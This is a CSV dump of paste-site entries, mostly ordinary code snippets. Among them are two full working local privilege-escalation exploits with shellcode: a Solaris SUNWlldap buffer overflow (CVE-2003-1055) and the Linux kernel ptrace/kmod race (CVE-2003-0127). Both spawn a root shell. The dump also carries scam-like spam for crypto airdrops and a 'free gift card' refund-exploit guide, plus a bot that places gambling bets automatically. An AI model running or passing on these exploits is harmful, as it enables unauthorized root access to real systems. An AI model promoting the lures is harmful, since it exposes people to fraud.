id,title,username,language,date,content
cvbVZ9KE,mobile page navigation,petar_bonov,HTML,Monday 22nd of January 2024 06:00:49 AM CDT,"<div id=""nav-review-page"">
	<div class=""nav-container"">
		<a href=""#"" id=""first-button"" class=""disabled"">
			<i class=""head-icon icon-first-page""></i>
		</a>

		<a href=""#"" class=""prevnextbutton disabled"">
			<i class=""head-icon icon-gallery-arrow-left""></i>
		</a>

		<div class=""page"">
			<span class=""current"">1</span>
			<span class=""count"">of 3045</span>
		</div>

		<a href=""news.php3?iPage=2"" class=""prevnextbutton"">
			<i class=""head-icon icon-gallery-arrow-right""></i>
		</a>

		<a href=""news.php3?iPage=3045"" id=""last-button"">
			<i class=""head-icon icon-last-page""></i>
		</a>
	</div>
</div>"
NKLkYuwK,data819,TestGuy1,JSON,Monday 22nd of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '458a3848d6bc459c382fe7a8e5516513e65945298daab571c20f5ce5c113580932ef4c6ef53f6c1e0ac7e02ade567d623ceca1b765adabc9c9897d7308ac0bf641ae810eb35e38359312bb7a2f9681a1ee2013235154ed835d4e93a242bd325ce5c8eb060d34ea0c8d25fb798946525a773809c716df1a98c0d3a7237299b4dd',
  otherdata: [
    '35de6625585ade0ecd5c11e02ea169c7',
    '7958accaddc77584d72a62c6645f3d9a',
    '097d51c1fe903c9c520fb11331e43503',
    '751166d581dfd59f1ce5e186500381dc',
    '42bbdf6e6e8656fbebc85c3fe5d625c2',
    'b8150b693429445e5131f0b808f80155',
    '31a2f5bc44a00ccdec9ea2b5746a6ece',
    '0687a8c11565db63f53b9dc5753d1bac'
  ]
}"
8u8AATLp,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Monday 22nd of January 2024 05:46:11 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

579383"
MUqX9Geq,PrintSpacePositions,prizrak567890,C++,Monday 22nd of January 2024 05:19:27 AM CDT,"void PrintSpacePositions(string text) {
	
	while (text.find(' ')!= string::npos) {
		auto a = text.find(' ');
		cout << a << endl;
		text.erase(a,1);
		text.insert(text.begin() + a, 1);
	}

}"
HdfKteke,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Monday 22nd of January 2024 05:07:36 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_668968.pdf
 
Working as of
22 January 2024"
N0Xpc637,stop deleteing my pastes,coinwalk,JavaScript,Monday 22nd of January 2024 04:30:51 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/100).toFixed(8)); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var upper = 6.9;
var downer = 2.9;
var bob = oldestbal;
var mutt = true;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
 
 
function get(){
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.clear();
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if (bellance<(fart-(botplus*downer))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if ((bellance<=(botplus*20))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
}
if ((bellance<=(botplus*20))&&(bellance>(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
}
if ((bellance<=(botplus*20))&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if ((oldestbal<=(botplus*20))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
}
if ((oldestbal<=(botplus*20))&&(bellance>(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
}
if ((oldestbal<=(botplus*20))&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if (bellance>=(oldestbal*24)) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
}
setInterval(() => get(), 10);"
8Zjf34hz,01. Count Real Numbers,Spocoman,C++,Monday 22nd of January 2024 04:21:52 AM CDT,"#include <iostream>
#include <string>
#include <sstream>
#include <map>

using namespace std;

int main() {
    string line;
    getline(cin, line);

    map<double, int> numbers;

    istringstream ss(line);

    double number;

    while (ss >> number) {
        numbers[number]++;
    }

    for(auto& n : numbers) {
        cout << n.first << "" -> "" << n.second << endl;
    }

    return 0;
}"
saPx1JrX,Sun SUNWlldap Library Hostname - Local Buffer Overflow - CVE-2003-1055,FlyFar,C,Monday 22nd of January 2024 04:16:03 AM CDT,"/***********************************************************
* hoagie_solarisldap.c
*
* gcc hoagie_solarisldap.c -o hoagie_solarisldap
*
* Author: Andi <andi@void.at>
*
* Greetz to Greuff, philipp and the other hoagie-fellas :-)
*
* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
* DAMAGE DONE USING THIS PROGRAM.
*
*
* Offsets: 9208 ... without patch 108994-11
*
************************************************************/

#include <stdio.h>

#define NOP 0x90
#define ORIGSIZE 258

char shellcode[]=
/* main: */
""\xeb\x0a"" /* jmp initcall */

/* initlcall: */
""\x9a\x01\x02\x03\x5c\x07\x04"" /* lcall */
""\xc3"" /* ret */

/* jmpz: */
""\xeb\x05"" /* jmp setuidcode */

/* initcall: */
""\xe8\xf9\xff\xff\xff"" /* call jmpz */

/* setuidcode: */
""\x5e"" /* popl %esi */
""\x29\xc0"" /* subl %eax, %eax */
""\x88\x46\xf7"" /* movb %al, 0xfffffff7(%esi) */
""\x89\x46\xf2"" /* movl %eax, 0xfffffff2(%esi) */

/* seteuid(0); */
""\x50"" /* pushl %eax */
""\xb0\x8d"" /* movb $0x8d, %al */
""\xe8\xe0\xff\xff\xff"" /* call initlcall */
/* setuid(0); */
""\x29\xc0"" /* subl %eax, %eax */
""\x50"" /* pushl %eax */
""\xb0\x17"" /* movb $0x17, %al */
""\xe8\xd6\xff\xff\xff"" /* call initlcall */

""\xeb\x1f"" /* jmp callz */

/* start: */
/* execve /bin/sh */
""\x5e"" /* popl %esi */
""\x8d\x1e"" /* leal (%esi), %ebx */
""\x89\x5e\x0b"" /* movl %ebx, 0x0b(%esi) */
""\x29\xc0"" /* subl %eax, %eax */
""\x88\x46\x19"" /* movb %al, 0x19(%esi) */
""\x89\x46\x14"" /* movl %eax, 0x14(%esi) */
""\x89\x46\x0f"" /* movl %eax, 0x0f(%esi) */
""\x89\x46\x07"" /* movl %eax, 0x07(%esi) */
""\xb0\x3b"" /* movb $0x3b, %al */
""\x8d\x4e\x0b"" /* leal 0x0b(%esi), %ecx */
""\x51"" /* pushl %ecx */
""\x51"" /* pushl %ecx */
""\x53"" /* pushl %ebx */
""\x50"" /* pushl %eax */
""\xeb\x18"" /* jmp lcall */

/* callz: */
""\xe8\xdc\xff\xff\xff"" /* call start */

""\x2f\x62\x69\x6e\x2f\x73\x68"" /* /bin/sh */
""\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03""

/* lcall: */
""\x9a\x04\x04\x04\x04\x07\x04""; /* lcall */



unsigned long getsp(void)
{
__asm__("" movl %esp,%eax "");
}

int main(int argc, char **argv) {
char buf[512];
int offset = 9208;
int retaddr = 0;
int i;

if (argc > 1) {
sscanf(argv[1], ""%d"", &offset);
}

printf(""hoagie_solarisldap local root exploit\n"");
printf(""[*] offset: 0x%x\n"", offset);

memset(buf, NOP, sizeof(buf));
buf[28] = 0xeb;
buf[29] = 30;
for (i = 0; i < strlen(shellcode); i++) {
buf[i + 60] = shellcode[i];
}

retaddr = getsp() - offset;
printf(""[*] return address: 0x%x\n"", retaddr);

for (i = 0; i < 4 * 25; i += 4){
buf[i + ORIGSIZE + 2] = retaddr & 0xff;
buf[i + ORIGSIZE + 3] = (retaddr >> 8 ) &0xff;
buf[i + ORIGSIZE + 0] = (retaddr >> 16 ) &0xff;
buf[i + ORIGSIZE + 1] = (retaddr >> 24 ) &0xff;
}

execl(""/usr/sbin/ping"", ""ping"", buf, NULL);
}


// milw0rm.com [2003-04-01]
            "
3u5UzjdC,Untitled,kwest87,C#,Monday 22nd of January 2024 04:15:12 AM CDT,"using System;

namespace ConsoleApp29
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int health = 50;
            int mana = 30;
            int maximumHealth = 100;
            int maximumMana = 100;
            int healthPosition = 0;
            int manaPosition = 1;
            char healthSymbol = 'h';
            char manaSymbol = 'm';
            bool isWork = true;

            while (isWork)
            {
                RenderingBar(health, maximumHealth, healthPosition, healthSymbol, ConsoleColor.Red);
                RenderingBar(mana, maximumMana, manaPosition, manaSymbol, ConsoleColor.DarkCyan);
            }
        }

        static void RenderingIndicator(int value, int maximumValue, char sumbol, ConsoleColor color)
        {
            Console.BackgroundColor = color;
            string indicator = """";

            for (int i = value; i < maximumValue; i++)
            {
                indicator += sumbol;
            }

            Console.Write(indicator);
        }

        static void RenderingBar(int value, int maximumValue, int position, char sumbol, ConsoleColor color)
        {
            Console.SetCursorPosition(0, position);
            ConsoleColor original = Console.BackgroundColor;
            Console.Write(""["");
            RenderingIndicator(0, value, sumbol, color);
            RenderingIndicator(value, maximumValue, sumbol, original);
            Console.WriteLine(""]"");
            Console.ReadKey();
        }
    }
}"
inWNPK8j,Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation - CVE-2003-0127,FlyFar,C,Monday 22nd of January 2024 04:14:20 AM CDT,"/*
 * Linux kernel ptrace/kmod local root exploit
 *
 * This code exploits a race condition in kernel/kmod.c, which creates
 * kernel thread in insecure manner. This bug allows to ptrace cloned
 * process, allowing to take control over privileged modprobe binary.
 *
 * Should work under all current 2.2.x and 2.4.x kernels.
 * 
 * I discovered this stupid bug independently on January 25, 2003, that
 * is (almost) two month before it was fixed and published by Red Hat
 * and others.
 * 
 * Wojciech Purczynski <cliph@isec.pl>
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED ""AS IS"" AND WITHOUT ANY WARRANTY
 * 
 * (c) 2003 Copyright by iSEC Security Research
 */

#include <grp.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <paths.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <linux/user.h>

char cliphcode[] =
	""\x90\x90\xeb\x1f\xb8\xb6\x00\x00""
	""\x00\x5b\x31\xc9\x89\xca\xcd\x80""
	""\xb8\x0f\x00\x00\x00\xb9\xed\x0d""
	""\x00\x00\xcd\x80\x89\xd0\x89\xd3""
	""\x40\xcd\x80\xe8\xdc\xff\xff\xff"";

#define CODE_SIZE (sizeof(cliphcode) - 1)

pid_t parent = 1;
pid_t child = 1;
pid_t victim = 1;
volatile int gotchild = 0;

void fatal(char * msg)
{
	perror(msg);
	kill(parent, SIGKILL);
	kill(child, SIGKILL);
	kill(victim, SIGKILL);
}

void putcode(unsigned long * dst)
{
	char buf[MAXPATHLEN + CODE_SIZE];
	unsigned long * src;
	int i, len;

	memcpy(buf, cliphcode, CODE_SIZE);
	len = readlink(""/proc/self/exe"", buf + CODE_SIZE, MAXPATHLEN - 1);
	if (len == -1)
		fatal(""[-] Unable to read /proc/self/exe"");

	len += CODE_SIZE + 1;
	buf[len] = '\0';
	
	src = (unsigned long*) buf;
	for (i = 0; i < len; i += 4)
		if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
			fatal(""[-] Unable to write shellcode"");
}

void sigchld(int signo)
{
	struct user_regs_struct regs;

	if (gotchild++ == 0)
		return;
	
	fprintf(stderr, ""[+] Signal caught\n"");

	if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) == -1)
		fatal(""[-] Unable to read registers"");
	
	fprintf(stderr, ""[+] Shellcode placed at 0x%08lx\n"", regs.eip);
	
	putcode((unsigned long *)regs.eip);

	fprintf(stderr, ""[+] Now wait for suid shell...\n"");

	if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
		fatal(""[-] Unable to detach from victim"");

	exit(0);
}

void sigalrm(int signo)
{
	errno = ECANCELED;
	fatal(""[-] Fatal error"");
}

void do_child(void)
{
	int err;

	child = getpid();
	victim = child + 1;

	signal(SIGCHLD, sigchld);

	do
		err = ptrace(PTRACE_ATTACH, victim, 0, 0);
	while (err == -1 && errno == ESRCH);

	if (err == -1)
		fatal(""[-] Unable to attach"");

	fprintf(stderr, ""[+] Attached to %d\n"", victim);
	while (!gotchild) ;
	if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
		fatal(""[-] Unable to setup syscall trace"");
	fprintf(stderr, ""[+] Waiting for signal\n"");

	for(;;);
}

void do_parent(char * progname)
{
	struct stat st;
	int err;
	errno = 0;
	socket(AF_SECURITY, SOCK_STREAM, 1);
	do {
		err = stat(progname, &st);
	} while (err == 0 && (st.st_mode & S_ISUID) != S_ISUID);
	
	if (err == -1)
		fatal(""[-] Unable to stat myself"");

	alarm(0);
	system(progname);
}

void prepare(void)
{
	if (geteuid() == 0) {
		initgroups(""root"", 0);
		setgid(0);
		setuid(0);
		execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
		fatal(""[-] Unable to spawn shell"");
	}
}

int main(int argc, char ** argv)
{
	prepare();
	signal(SIGALRM, sigalrm);
	alarm(10);
	
	parent = getpid();
	child = fork();
	victim = child + 1;
	
	if (child == -1)
		fatal(""[-] Unable to fork"");

	if (child == 0)
		do_child();
	else
		do_parent(argv[0]);

	return 0;
}

// milw0rm.com [2003-03-30]
            "
